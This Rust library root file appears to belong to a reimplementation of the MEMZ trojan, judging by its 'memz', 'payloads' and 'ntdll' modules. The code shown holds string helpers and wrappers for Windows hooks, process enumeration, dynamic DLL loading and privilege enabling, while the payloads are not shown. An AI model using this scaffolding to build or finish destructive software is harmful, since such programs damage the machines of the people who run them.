pub const LMEM_ZEROINIT: u8 = 0;

pub mod data;
pub mod memz;
pub mod ntdll;
pub mod payloads;

pub mod winapi_type {
    pub type DWORD = u32;
    pub type PDWORD = *mut u32;
    pub type PBYTE = *mut u8;
    pub type ULONG = u32;
    pub type BOOLEAN = u8;
    pub type PBOOLEAN = *mut u8;
}

pub mod convert_str {
    // https://github.com/microsoft/windows-rs/issues/973#issuecomment-1363481060
    use windows::core::{PCSTR, PCWSTR};

    pub struct PCWSTRWrapper {
        text: PCWSTR,
        // this is here to allow it to get dropped at the same time as the PCWSTR
        #[allow(unused)]
        _container: Vec<u16>,
    }

    impl std::ops::Deref for PCWSTRWrapper {
        type Target = PCWSTR;

        fn deref(&self) -> &Self::Target {
            &self.text
        }
    }

    pub trait ToPCWSTRWrapper {
        fn to_pcwstr(&self) -> PCWSTRWrapper;
    }

    impl ToPCWSTRWrapper for &str {
        fn to_pcwstr(&self) -> PCWSTRWrapper {
            // do not drop when scope ends, by moving it into struct
            let mut text = self.encode_utf16().collect::<Vec<_>>();
            text.push(0);

            PCWSTRWrapper {
                text: PCWSTR::from_raw(text.as_ptr()),
                _container: text,
            }
        }
    }

    impl ToPCWSTRWrapper for PCWSTR {
        fn to_pcwstr(&self) -> PCWSTRWrapper {
            PCWSTRWrapper {
                text: *self,
                _container: Vec::new(),
            }
        }
    }

    pub struct PCSTRWrapper {
        text: PCSTR,
        #[allow(unused)]
        _container: Vec<u8>,
    }

    impl std::ops::Deref for PCSTRWrapper {
        type Target = PCSTR;

        fn deref(&self) -> &Self::Target {
            &self.text
        }
    }

    pub trait ToPCSTRWrapper {
        fn to_pcstr(&self) -> PCSTRWrapper;
    }

    impl ToPCSTRWrapper for &str {
        fn to_pcstr(&self) -> PCSTRWrapper {
            // https://stackoverflow.com/questions/47980023/how-to-convert-from-u8-to-vecu8
            let mut text = self.as_bytes().iter().cloned().collect::<Vec<u8>>();
            text.push(0); // add null

            PCSTRWrapper {
                text: PCSTR(text.as_ptr()),
                _container: text, // data lifetime management
            }
        }
    }

    impl ToPCSTRWrapper for PCSTR {
        fn to_pcstr(&self) -> PCSTRWrapper {
            PCSTRWrapper {
                text: *self,
                _container: Vec::new(),
            }
        }
    }
}

pub mod wrap_windows_api {
    use std::{ffi::c_void, mem::size_of};

    use crate::convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper};
    use windows::{
        core::PCSTR,
        imp::{GetProcAddress, LoadLibraryA},
        Win32::{
            Foundation::{
                CloseHandle, GetLastError, BOOL, ERROR_NOT_ALL_ASSIGNED, HANDLE, HMODULE, HWND,
                INVALID_HANDLE_VALUE, LUID,
            },
            Globalization::lstrcmpW,
            Security::{
                AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED,
                TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_PRIVILEGES_ATTRIBUTES,
                TOKEN_QUERY,
            },
            System::{
                Diagnostics::ToolHelp::{
                    CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
                },
                ProcessStatus::GetProcessImageFileNameA,
                Threading::{GetCurrentProcess, GetCurrentThreadId, OpenProcessToken},
            },
            UI::WindowsAndMessaging::{
                GetSystemMetrics, MessageBoxA, SetWindowsHookExA, UnhookWindowsHookEx, HHOOK,
                HOOKPROC, MESSAGEBOX_RESULT, MESSAGEBOX_STYLE, SM_CXSCREEN, SM_CYSCREEN,
                SYSTEM_METRICS_INDEX, WINDOWS_HOOK_ID,
            },
        },
    };

    pub struct Resolution {
        pub scrw: i32,
        pub scrh: i32,
    }

    impl Resolution {
        pub fn new() -> Self {
            Self {
                scrw: Self::wrap_with_result(SM_CXSCREEN).unwrap(),
                scrh: Self::wrap_with_result(SM_CYSCREEN).unwrap(),
            }
        }

        fn wrap_with_result(nindex: SYSTEM_METRICS_INDEX) -> Result<i32, ()> {
            unsafe {
                match GetSystemMetrics(nindex) {
                    // GetLastError() does not provide extended error
                    0 => Err(eprintln!("Failed GetSystemMetrics function")),
                    value => Ok(value),
                }
            }
        }
    }

    pub fn lstrcmp_w<T, U>(str1: T, str2: U) -> bool
    where
        T: ToPCWSTRWrapper,
        U: ToPCWSTRWrapper,
    {
        unsafe {
            let str1 = str1.to_pcwstr();
            let str2 = str2.to_pcwstr();

            let cmp = lstrcmpW(*str1, *str2);

            if cmp == 0 {
                false
            } else {
                true
            }
        }
    }

    pub fn wrap_get_process_image_filename_a(fn_buf: &mut Vec<u8>) -> Result<u32, ()> {
        unsafe {
            match GetProcessImageFileNameA(GetCurrentProcess(), fn_buf) {
                0 => Err(eprintln!(
                    "Failed to GetProcessImageFileNameA\n{:?}",
                    GetLastError()
                )),
                v => Ok(v),
            }
        }
    }

    pub fn wrap_create_toolhelp32_snapshot() -> Result<HANDLE, ()> {
        unsafe {
            match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(INVALID_HANDLE_VALUE) => Err(eprintln!(
                    "Faiiled CreateToolhelp32Snapshot\n{:?}",
                    GetLastError()
                )),
                Ok(handle) => Ok(handle),
                _ => panic!(),
            }
        }
    }

    pub fn wrap_close_handle(h_object: HANDLE) -> Result<BOOL, ()> {
        unsafe {
            match CloseHandle(h_object) {
                BOOL(0) => Err(eprintln!("CloseHandle Error\n{:?}", GetLastError())),
                ret => Ok(ret),
            }
        }
    }

    pub fn wrap_process32_next(hsnapshot: HANDLE, lppe: &mut PROCESSENTRY32) -> bool {
        unsafe {
            match Process32Next(hsnapshot, lppe) {
                BOOL(1) => true,
                BOOL(0) => false,
                _ => panic!(),
            }
        }
    }

    pub fn wrap_set_windows_hook_ex_a(
        idhook: WINDOWS_HOOK_ID,
        lpfn: HOOKPROC,
        hmod: HMODULE,
        dwthreadid: u32,
    ) -> Result<HHOOK, ()> {
        unsafe {
            match SetWindowsHookExA(idhook, lpfn, hmod, dwthreadid) {
                Err(e) => Err(eprintln!(
                    "SetWindowsHookExA Error:\n{e:#?}\nGetLastError(): {:?}",
                    GetLastError()
                )),
                Ok(h_handle) => Ok(h_handle),
            }
        }
    }

    pub fn wrap_get_current_thread_id() -> u32 {
        unsafe { GetCurrentThreadId() }
    }

    pub fn wrap_messagebox_a<T, U>(
        hwnd: HWND,
        lptext: T,
        lpcaption: U,
        utype: MESSAGEBOX_STYLE,
    ) -> Result<MESSAGEBOX_RESULT, ()>
    where
        T: ToPCSTRWrapper,
        U: ToPCSTRWrapper,
    {
        let lptext = *lptext.to_pcstr();
        let lpcaption = *lpcaption.to_pcstr();
        unsafe {
            match MessageBoxA(hwnd, lptext, lpcaption, utype) {
                MESSAGEBOX_RESULT(0) => Err(eprintln!(
                    "MessageBoxA Error\nGetLastError(): {:?}",
                    GetLastError()
                )),
                v => Ok(v),
            }
        }
    }

    pub fn wrap_unhook_windows_hook_ex(hhk: HHOOK) -> Result<BOOL, ()> {
        unsafe {
            match UnhookWindowsHookEx(hhk) {
                BOOL(0) => Err(eprintln!(
                    "UnhookWindowsHookEx Error\nGetLastError(): {:?}",
                    GetLastError()
                )),
                v => Ok(v),
            }
        }
    }

    pub fn wrap_load_library_a<T>(name: T) -> Result<HMODULE, ()>
    where
        T: ToPCSTRWrapper,
    {
        let name = *name.to_pcstr();
        unsafe {
            match LoadLibraryA(name) {
                0 => Err(eprintln!(
                    "Failed LoadLibraryA\nGetLastError(): {:?}",
                    GetLastError()
                )),
                v => Ok(HMODULE(v)),
            }
        }
    }

    pub fn wrap_get_proc_address<T>(library: HMODULE, name: T) -> Result<*const c_void, ()>
    where
        T: ToPCSTRWrapper,
    {
        let name = *name.to_pcstr();
        unsafe {
            let ret = GetProcAddress(library.0, name);
            if ret.is_null() {
                Err(eprintln!(
                    "Failed GetProcAddress\nGetLastError(): {:?}",
                    GetLastError()
                ))
            } else {
                Ok(ret)
            }
        }
    }

    pub fn wrap_set_privilege<T>(lpsz_privilege: T, b_enabl_privilege: bool) -> Result<bool, ()>
    where
        T: ToPCSTRWrapper,
    {
        let lpsz_privilege = *lpsz_privilege.to_pcstr();

        let mut h_token = HANDLE::default();
        let mut tp: TOKEN_PRIVILEGES = Default::default();
        let mut luid: LUID = Default::default();

        let lpv = unsafe { LookupPrivilegeValueA(PCSTR::null(), lpsz_privilege, &mut luid) };
        let opt = unsafe {
            OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut h_token,
            )
        };
        if !(lpv.as_bool() && opt.as_bool()) {
            return Err(eprintln!(
                "Failed LookupPrivilegeValueA()\nGetLastError: {:?}",
                unsafe { GetLastError() }
            ));
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;

        if b_enabl_privilege {
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        } else {
            tp.Privileges[0].Attributes = TOKEN_PRIVILEGES_ATTRIBUTES(0);
        }

        let atp = unsafe {
            AdjustTokenPrivileges(
                h_token,
                BOOL(0),
                Some(&tp),
                size_of::<TOKEN_PRIVILEGES>() as u32,
                None,
                None,
            )
        };

        if !atp.as_bool() {
            return Err(eprintln!(
                "Failed AdjustTokenPrivileges()\nGetLastError: {:?}",
                unsafe { GetLastError() }
            ));
        }

        unsafe {
            if GetLastError() == ERROR_NOT_ALL_ASSIGNED {
                return Err(eprintln!(
                    "The token does not have the specified privilege.\n"
                ));
            }
        }
        dbg!(&tp);
        return Ok(true);
    }
}
